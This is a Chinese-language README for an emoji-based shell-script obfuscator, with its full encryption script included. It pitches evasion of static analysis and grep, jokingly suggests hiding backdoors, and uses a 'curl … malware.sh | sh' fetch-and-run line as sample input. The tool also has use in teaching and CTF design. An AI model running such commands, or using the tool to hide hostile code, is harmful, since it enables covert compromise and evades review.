🌟 EmojiShell | 用表情包守护你的 Shell 脚本

项目定位：

一个专注于 Emoji 混淆技术 的 Shell 脚本安全工具库，通过将敏感代码转换为颜文字、符号组合和动态字体，实现 视觉迷惑 与 逆向防御 的平衡。

🔑 核心功能

1. Emoji 代码伪装
   - 将 
"rm -rf" 转换为 
"✂️➡️🚫📁"，混淆关键指令
   - 支持自定义 Emoji 映射表（如 
"🐚=echo", 
"😈=sudo"）
2. 动态混淆引擎
   - 基于 Shell 的运行时语法代码加密（每次执行自动变换 Emoji 形式）
   - 结合 多种混合加密的 Emoji 编码方案
3. 反调试陷阱
   - 通过 
"$RANDOM" 生成伪随机 Emoji 流干扰静态分析
4. Shell 加壳工具
   - 一键生成混淆后的 
".sh" 二进制文件（兼容 Linux/macOS）
   - 支持自定义 Shell 解释器内容

🎯 技术亮点

- 立即部署：
“使用 Shell 来加密 Shell”
- 视觉欺骗设计：
EmojiCode

# 原始命令
curl https://example.com/malware.sh | sh

# EmojiShell 版本
c$(🐚)1$(☕)2$(🌐)  b$(📡)$(🔍)$(🚪)$(💻)  |  $(💻)
- 可扩展性：
   - 兼容 
"zsh"/
"ash" 等非标准 Shell 环境

🚀 快速上手

# 安装依赖
git clone https://github.com/haothtrteen/EmojiShell.git
cd EmojiShell && chmod +x install.sh

# 混淆示例
echo "whoami" | ./emoji-obfuscator --level hard
# 输出：$(📡)$(🔍)$(🚪)$(💻)

# 生成全加密脚本
修改 EmojiCode.sh 文件中指定的加密文件路径
`text="example.sh" #原脚本绝对路径`
将 example.sh 替换为你要加密的shell文件路径后执行加密脚本即可

🛡️ 应用场景

- 敏感脚本保护：运维脚本、自动化渗透测试工具
- 代码混淆教学：逆向工程实验、CTF 题目设计
- 沙雕开发：用 Emoji 写出无法被 grep 搜索到的隐藏后门 😈

# 现有核心加密代码展示

```
#!/bin/sh
#================配置区==================
text="example.sh"  # 原脚本绝对路径
sed_d="|"          # Sed分隔符
log_file="zz_log.txt"
#======================================

# 你的Zz变量名生成函数（原封不动）
generate_variable_name() {
    local length=16
    local charset="___Z__z"
    local variable_name=""
    local i=1
    while [ $i -le $length ]; do
        local rand_idx=$(( RANDOM % ${#charset} ))
        variable_name="${variable_name}${charset:$rand_idx:1}"
        i=$((i+1))
    done
    echo "$variable_name"
}

# 生成emoji函数名（原封不动）
gen_emoji() {
    local cs="💦🛑🍒💜🎋🐬🏡🏟🏜🔔🐞🐗🌍💝🏕🍆💖❤🚤💛🐯🐣💚💞🚁🐸🔕🐷💜🏝💛💔🔕🎁🏗💗💔🐳💚💜🏕🌶🍭🛑🖤💦🍁🌍🌛🚤🍒💦🏕💚🐯💜🐬🌍🐸🎋💞🐬🛑🍄🎋💗💞💙🍄🌛🌍🐗🐸🚫🐯💦🏝🐳🍁🐷🏕🚀🏗🚀🏟🐗🌶🚀💞🍎🌤🖤🌶🍆💕💗🐬💜💛🐮💙🏝🌟💔💕🍒🐞🍒🐮💔🏗🐗❣🏡🏡🐮🐗🖤🍆💕🐯💙🍆💖💙❤🏗🖤🛑🌛🍎🐮🍆🖤🐯🚁🚫🐞🖤💞🐣🐯💙💙🐸💦🚫🐝🏟🌤❤❤️🍎🎁🏝🐷💝🍷🍎🏕💜💙🐬🛑🐷💙💔🎋🏝💚🐳💕🌶🌛🔔🌍💕🐮🐬🍭💞🏡🎁🍒🍒🏕🍷🐳🚀🐗🎁💦🎋🍭💙🐮🌍💛🚁🍁💚🍒🚀🐳💝💜🔔💙🌍❤💙💙🌛🏗🍎🐮🚀🐮🌛🍄🐳🌛🔥🚫🐣🐬💞💝🍭🏗🏗🐣❣🚁🌍🌶🛑💕🎁🐯🚫💙🖤🐷🐸🐯❤"
    local fn=""
    local i=1
    while [ $i -le 12 ]; do
        local r=$(( RANDOM % ${#cs} ))
        fn="${fn}${cs:$r:1}"
        i=$((i+1))
    done
    echo "$fn"
}

# 核心流程：保护Shebang+优化Sed排除（仅新增双引号加密步骤+合并emoji函数为一行）
encrypt_fixed_final() {
    local txt="$1"
    local tmp="temp_${txt}"
    local map="zz_map.txt"
    local emoji="emoji_funcs.sh"
    local used_zz=" "
    > "$log_file"

    # 初始化：复制原文件，保护Shebang（第一行）
    [ ! -f "$txt" ] && { echo "错误：原文件 $txt 不存在！"; return 1; }
    cp "$txt" "$tmp"
    > "$map"
    > "$emoji"  # 清空emoji文件，后续统一写入合并后的函数
    local emoji_funcs=""  # 新增：用于拼接所有emoji函数（一行）
    echo "===== Zz标记日志 =====" >> "$log_file"

    # --------------------------
    # 步骤1：标记变量名（和之前一致）
    # --------------------------
    local vars=$(grep -v '^#' "$tmp" | grep '^[a-zA-Z_][a-zA-Z0-9_]*=' | cut -d'=' -f1 | sort -u)
    for var in $vars; do
        local zz_mark=$(generate_variable_name)
        while echo "$used_zz" | grep -q " ${zz_mark} "; do
            zz_mark=$(generate_variable_name)
        done
        used_zz="${used_zz}${zz_mark} "
        echo "${zz_mark} ${var} var" >> "$map"
        echo "标记：${var} → ${zz_mark}" >> "$log_file"
        sed -i "s${sed_d}^${var}=${zz_mark}=${sed_d}" "$tmp"
    done

    local brace_vars=$(grep -v '^#' "$tmp" | grep -o '\$\{[a-zA-Z_][a-zA-Z0-9_]*\}' | \
        sed "s${sed_d}\$\{${sed_d}${sed_d}\}${sed_d}" | sort -u)
    for var in $brace_vars; do
        if echo "$used_zz" | grep -q " ${var} "; then continue; fi
        local zz_mark=$(generate_variable_name)
        while echo "$used_zz" | grep -q " ${zz_mark} "; do
            zz_mark=$(generate_variable_name)
        done
        used_zz="${used_zz}${zz_mark} "
        echo "${zz_mark} ${var} brace" >> "$map"
        echo "标记：${var} → ${zz_mark}" >> "$log_file"
        sed -i "s${sed_d}\$\{${var}\\}${sed_d}\$\{${zz_mark}\\}${sed_d}g" "$tmp"
    done

    local bracket_vars=$(grep -v '^#' "$tmp" | grep -o '\[[a-zA-Z_][a-zA-Z0-9_]*\]' | \
        sed "s${sed_d}\[${sed_d}${sed_d}\]${sed_d}" | sort -u)
    for var in $bracket_vars; do
        if echo "$used_zz" | grep -q " ${var} "; then continue; fi
        local zz_mark=$(generate_variable_name)
        while echo "$used_zz" | grep -q " ${zz_mark} "; do
            zz_mark=$(generate_variable_name)
        done
        used_zz="${used_zz}${zz_mark} "
        echo "${zz_mark} ${var} bracket" >> "$map"
        echo "标记：${var} → ${zz_mark}" >> "$log_file"
        sed -i "s${sed_d}\[${var}\]${sed_d}\[${zz_mark}\]${sed_d}g" "$tmp"
    done

    # --------------------------
    # 关键修复1：保护Shebang+原加密步骤（修改emoji函数为拼接）
    # --------------------------
    echo -e "\n===== 原加密日志（保护Shebang） =====" >> "$log_file"
    local target_chars=$(
        tail -n +2 "$tmp" | sed "s${sed_d}#.*${sed_d}${sed_d}" | \
        grep -oE '"[^"]*"|[a-zA-Z0-9]+' | tr -d '"' | fold -w1 | \
        grep -E '[a-zA-Z0-9]' | grep -v -E '[Zz_]' | sort -u | grep -v '^$'
    )

    # 原逻辑：循环追加单行 → 新逻辑：拼接成字符串（用分号分隔函数）
    for char in $target_chars; do
        local ej=$(gen_emoji)
        # 拼接函数到变量，而非直接写入文件
        emoji_funcs+="${ej}() { printf \"%s\" \"${char}\"; };"
        echo "原加密：${char} → ${ej}" >> "$log_file"
        sed -i "1! { /[Zz_]/! s${sed_d}${char}${sed_d}\$\(${ej}\)${sed_d}g; }" "$tmp"
    done

    # --------------------------
    # 【新增步骤：还原前加密双引号内字符（同样拼接emoji函数）】
    # --------------------------
    echo -e "\n===== 新增：还原前加密双引号内字符 =====" >> "$log_file"
    local quote_chars=$(
        tail -n +2 "$tmp" | grep -v -E '^#|[Zz_]' | \
        grep -o '"[^"]*"' | tr -d '"' | \
        fold -w1 | grep -E '[a-zA-Z0-9]' | sort -u | grep -v '^$'
    )

    # 同样拼接函数到变量，而非直接写入文件
    for char in $quote_chars; do
        local ej_quote=$(gen_emoji)
        emoji_funcs+="${ej_quote}() { printf \"%s\" \"${char}\"; };"
        echo "双引号加密：${char} → ${ej_quote}" >> "$log_file"
        sed -i "1! { /^#/! { /[Zz_]/! { /\"[^\"]*\"/ s${sed_d}\(${char}\)${sed_d}\$\(${ej_quote}\)${sed_d}g; } } }" "$tmp"
    done

    # 关键：将所有拼接好的emoji函数（一行）写入文件
    echo "$emoji_funcs" > "$emoji"

    # --------------------------
    # 关键修复2：确保还原生效（和之前一致）
    # --------------------------
    echo -e "\n===== 还原日志 =====" >> "$log_file"
    while read -r line; do
        local zz_mark=$(echo "$line" | cut -d' ' -f1)
        local var=$(echo "$line" | cut -d' ' -f2)
        local type=$(echo "$line" | cut -d' ' -f3)
        [ -z "$zz_mark" ] || [ -z "$var" ] && continue

        echo "还原前检查：临时文件中 ${zz_mark} → $(grep -c "$zz_mark" "$tmp" || echo "未找到")" >> "$log_file"
        case $type in
            var)
                sed -i "s${sed_d}^${zz_mark}=${var}=${sed_d}" "$tmp"
                ;;
            brace)
                sed -i "s${sed_d}\$\{${zz_mark}\\}${sed_d}\$\{${var}\\}${sed_d}g" "$tmp"
                ;;
            bracket)
                sed -i "s${sed_d}\[${zz_mark}\]${sed_d}\[${var}\]${sed_d}g" "$tmp"
                ;;
        esac
        echo "还原：${zz_mark} → ${var}" >> "$log_file"
    done < "$map"

    # --------------------------
    # 生成最终脚本（和之前一致）
    # --------------------------
    local shebang=$(head -n1 "$tmp")
    if [ "$shebang" != "#!/bin/sh" ]; then
        echo "警告：Shebang异常，修复为#!/bin/sh" >> "$log_file"
        sed -i '1c #!/bin/sh' "$tmp"
    fi

    cat "$emoji" "$tmp" > "protected_${txt}"
    rm "$tmp" "$map" "$emoji"

    echo "✅ 修复完成！已在还原前新增双引号加密步骤，且emoji函数合并为一行"
    echo "1. 加密脚本：protected_${txt}（Shebang已修复为#!/bin/sh）"
    echo "2. 日志文件：${log_file}（含新增双引号加密记录）"
}

# 调用函数
encrypt_fixed_final "$text"
```

📜 许可证

- MIT License（开源自由，但禁止用于非法活动）
- 商业授权：企业级定制化混淆规则需联系 
"2557976190@qq.com"

🤝 参与贡献

1. Fork 仓库并提交 PR（如新增 Emoji 编码规则）
2. 报告漏洞至 Issues（标注 
"[Security]" 标签）
3. 在 Twitter 带话题 
"#EmojiShell" 分享你的混淆成果 🚀

最后更新：2025-09-10

项目愿景：让 Shell 脚本成为逆向工程师的噩梦 🧟♂️💻

设计思路

1.  Shell语法
2. 尝试通过emoji来代替函数变量
3. 编写自动化加密工具


# 目前仍存在的bug以及需要更新的功能

- 在执行复杂命令或语法时会无法运行，正在尝试修复（暂时尝试使用跳过关键指令加密来修复）
- 在ash（Android系统终端环境）中运行并不是特别理想在尝试优化
- 目前只支持对“0~9,a~z”所有的数字及英文字母进行加密，对特殊字符语言的加密需要更新
- 暂不支持POSIX标准下的bash终端环境运行
